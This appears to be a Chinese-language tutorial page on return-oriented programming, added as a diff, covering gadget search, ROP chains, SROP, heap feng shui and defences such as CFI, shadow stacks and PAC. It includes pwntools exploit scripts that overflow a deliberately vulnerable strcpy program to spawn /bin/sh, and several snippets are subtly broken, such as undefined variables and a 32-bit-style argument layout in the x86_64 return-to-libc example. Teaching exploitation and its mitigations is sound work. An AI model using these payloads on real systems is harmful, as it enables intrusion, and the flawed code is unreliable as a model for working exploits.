@@ -1,0 +1,362 @@
+---
+title: ROP 攻击与返回导向编程
+description: ROP 攻击原理、Gadget 链构造、堆风水技术及现代防护机制（CFI、Shadow Stack）
+---
+
+# ROP 攻击与返回导向编程
+
+DEP 让你不能执行数据，ASLR 让地址不可预测——那攻击者还能为所欲为吗？
+
+ROP（Return-Oriented Programming，返回导向编程）是一种高级代码复用攻击技术。攻击者不注入新代码，而是「拼凑」程序中已有的代码片段（称为 Gadget），通过精心设计的调用链来执行任意操作。ASLR 和 DEP 普及后，ROP 成为了最流行的漏洞利用技术。
+
+## ROP 的诞生背景
+
+### 传统攻击的困境
+
+```
+攻击者面临的挑战：
+1. DEP/NX：内存中的数据不可执行，注入的 shellcode 无法运行
+2. ASLR：代码地址随机化，攻击者不知道该跳转到哪里
+
+解决方案：
+ROP 利用程序本身已有的代码，通过「复用」而非「注入」来实现攻击
+```
+
+### ROP 的核心思想
+
+```
+传统攻击：注入新的代码（shellcode）
+ROP 攻击：复用已有的代码（Gadget）
+
+Gadget：以 ret 指令结尾的代码片段
+ROP 链：Gadget 按顺序组成的调用链
+```
+
+## ROP Gadget
+
+### 什么是 Gadget
+
+```asm
+; x86_64 程序中的一个 gadget
+; 假设这个代码存在于程序或 libc 中
+gadget1:
+    pop rax        ; 从栈上弹出一个值到 rax
+    ret            ; 返回
+
+gadget2:
+    pop rdi        ; x86_64 调用约定：第一个参数
+    call rax       ; 调用 rax 中的函数
+    ret
+```
+
+### 寻找 Gadget
+
+```python
+# 使用 ROPgadget 工具寻找 gadget
+# pip install ROPgadget
+
+bash> ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | head -20
+
+Gadgets information
+============================================================
+0x001a1e7a : pop rax ; ret
+0x001a5e85 : pop rbp ; ret
+0x001b208b : pop rbx ; pop rbp ; ret
+0x00223f74 : pop r12 ; ret
+0x00223f72 : pop r12 ; pop r13 ; pop r14 ; ret
+```
+
+```python
+# 使用 pwntools 自动搜索 gadget
+from pwn import *
+
+elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+# 搜索 pop rdi ; ret
+pop_rdi = elf.search(asm('pop rdi; ret')).__next__()
+print(f"pop rdi; ret @ 0x{pop_rdi:x}")
+
+# 搜索 mov qword ptr [rsi], rdx ; ret
+mov_rsi_rdx = elf.search(asm('mov qword ptr [rsi], rdx; ret')).__next__()
+```
+
+### 常用 Gadget 类型
+
+| Gadget | 用途 |
+|---|---|
+| `pop rdi; ret` | 设置函数第一个参数 |
+| `pop rsi; pop rdx; ret` | 设置函数第二、三个参数 |
+| `pop rax; ret` | 设置返回值寄存器 |
+| `mov qword ptr [rsi], rdx; ret` | 写入内存 |
+| `syscall; ret` | 发起系统调用 |
+
+## ROP 链构造
+
+### 示例：调用 system("/bin/sh")
+
+```python
+from pwn import *
+
+# 假设已知 libc 地址
+libc_base = 0x00007ffff7dce000
+elf = ELF('./vulnerable_program')
+
+# 获取 gadgets
+pop_rdi = libc_base + 0x26b72  # pop rdi ; ret
+bin_sh = libc_base + next(elf.search(b'/bin/sh'))  # "/bin/sh" 字符串
+system = libc_base + libc.symbols['system']  # system() 函数
+
+# 构造 ROP 链
+# 函数调用约定：rdi = "/bin/sh", 然后 call system
+rop_chain = b''
+rop_chain += p64(pop_rdi)    # pop rdi; ret
+rop_chain += p64(bin_sh)     # rdi = "/bin/sh"
+rop_chain += p64(system)     # call system("/bin/sh")
+
+# 发送 payload
+# 72 字节填充 + ROP 链
+payload = b'A' * 72 + rop_chain
+io.sendline(payload)
+```
+
+### 完整利用示例
+
+```c
+// vulnerable.c
+#include <stdio.h>
+#include <string.h>
+
+void win() {
+    system("/bin/sh");
+}
+
+void vuln(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);
+}
+
+int main() {
+    vuln("test");
+    return 0;
+}
+```
+
+```python
+# exploit.py
+from pwn import *
+
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
+
+# 启动程序
+io = process('./vulnerable')
+
+# 获取 win 函数地址
+win_addr = elf.symbols['win']
+
+# 构造 payload
+# 64 字节填充 + 8 字节 RBP + win 地址
+payload = b'A' * 64 + b'B' * 8 + p64(win_addr)
+
+# 发送
+io.sendline(payload)
+io.interactive()  # 获取 shell
+```
+
+## 高级 ROP 技术
+
+### Return-to-libc
+
+最简单的 ROP 变体，只调用一个函数：
+
+```python
+# Return-to-libc：直接调用 system()
+# 比传统 ROP 更简单，但功能有限
+payload = b'A' * 72
+payload += p64(system_addr)      # 返回地址
+payload += p64(exit_addr)        # system 返回后的地址
+payload += p64(binsh_addr)       # system 的参数
+```
+
+### JOP（Jump-Oriented Programming）
+
+不使用 `ret`，而是用 `jmp` 或间接跳转：
+
+```asm
+; JOP 使用 dispatch GADGET
+dispatch:
+    jmp qword ptr [r11 + r10*8]  ; 间接跳转
+```
+
+### COP（Call-Oriented Programming）
+
+使用 `call` 指令，调用栈作为 ROP 链的载体：
+
+```asm
+; COP gadget
+gadget:
+    pop rdi
+    call rax
+    ; 返回到调用者
+```
+
+## SROP（Sigreturn-Oriented Programming）
+
+利用信号处理机制的攻击：
+
+```python
+# SROP 利用 Linux 的 sigreturn 系统调用
+# 可以在不知道任何地址的情况下设置所有寄存器
+
+# Frame 构造
+frame = SigreturnFrame(kernel=False)
+frame.rax = constants.SYS_execve
+frame.rdi = binsh_addr
+frame.rip = syscall_addr
+frame.rsp = stack_addr
+
+payload = b'A' * 64
+payload += p64(syscall_addr)  # 触发 sigreturn
+payload += bytes(frame)       # 设置所有寄存器
+```
+
+##堆风水（Heap Feng Shui）
+
+### 堆布局控制
+
+```python
+# 堆风水：控制堆分配顺序，为漏洞利用创造条件
+# 1. 分配大量块，消耗空闲内存
+for i in range(100):
+    alloc(i)
+
+# 2. 释放特定块，创造特定大小间隙
+free(50)
+free(60)
+
+# 3. 再次分配，控制布局
+# 此时分配可能填入特定位置
+```
+
+### House of Spirit
+
+```python
+# House of Spirit：释放伪造的 chunk，然后在期望位置重新分配
+# 可以控制任意地址的内存读写
+
+# 伪造 chunk 头部
+fake_chunk = p64(0)            # prev_size
+fake_chunk += p64(0x41)        # size (PREV_INUSE = 0)
+fake_chunk += p64(target_addr) # fd 指向目标地址
+
+# 释放伪造的 chunk
+free(fake_chunk_addr)
+
+# 重新分配，chunk 会被放置到 target_addr
+# 写入时可以达到任意地址
+```
+
+### House of Force
+
+```c
+// House of Force：利用 top chunk 的合并
+void *victim = malloc(0x100);
+void *overflow = malloc(0x200);
+
+void *target = malloc(0x100);
+// 通过溢出修改 top chunk 的 size
+// 下次分配会绕过 target，直接分配到任意地址
+```
+
+## 现代防护机制
+
+### CFI（控制流完整性）
+
+```bash
+# Clang CFI
+clang -fsanitize=cfi -o binary source.c
+
+# Forward-edge CFI：检查间接调用目标
+# Backward-edge CFI：检查返回地址
+```
+
+### Shadow Stack
+
+```bash
+# Intel CET (Control-flow Enforcement Technology)
+# Shadow Stack 保护返回地址
+
+# 编译时启用
+gcc -fcf-protection=full -o binary source.c
+
+# 运行时验证
+# 每个函数调用时，返回地址同时保存到 shadow stack
+# 函数返回时，从 shadow stack 验证返回地址
+```
+
+### PAC（Pointer Authentication Code）
+
+```asm
+; ARM64 Pointer Authentication
+; 指令签名和验证
+
+; 使用 PAC 签名指针
+paciza lr
+
+; 验证 PAC
+autiza lr
+
+; 如果签名不匹配，访问被拒绝
+```
+
+## 防御 ROP 的措施
+
+### 编译器层面
+
+```bash
+# 启用所有缓解措施
+gcc -fstack-protector-all \
+    -fPIE -pie \
+    -Wl,-z,relro,-z,now \
+    -fsanitize=cfi \
+    -fcf-protection=full \
+    -o safe binary.c
+```
+
+### 系统层面
+
+```bash
+# /proc/sys/kernel
+echo 2 > /proc/sys/kernel/randomize_va_space  # ASLR
+echo 1 > /proc/sys/kernel/exec-shield          # Exec Shield
+
+# Seccomp 限制系统调用
+# 允许最少的系统调用
+```
+
+### 应用层面
+
+```c
+// 安全编码实践
+void safe_function() {
+    // 1. 边界检查
+    char buffer[64];
+    size_t len = strlen(user_input);
+    if (len >= sizeof(buffer)) return;
+
+    // 2. 使用安全函数
+    strncpy(buffer, user_input, sizeof(buffer) - 1);
+    buffer[sizeof(buffer) - 1] = '\0';
+}
+```
+
+## 面试追问方向
+
+- ROP 和传统代码注入有什么区别？
+- 什么是 Gadget？为什么 ROP 不需要注入新代码？
+- 如何绕过 ASLR？有哪些技术？
+- 什么是堆风水？它在漏洞利用中有什么作用？
+- CFI 和 Shadow Stack 分别防护什么？
+- 如何检测一个程序是否容易被 ROP 攻击？
+
+> ROP 是现代漏洞利用的基石技术。面对 ASLR 和 DEP 的挑战，攻击者发展出了 ROP 来「复用」而非「注入」。理解 ROP 的原理，有助于设计更健壮的防御方案。
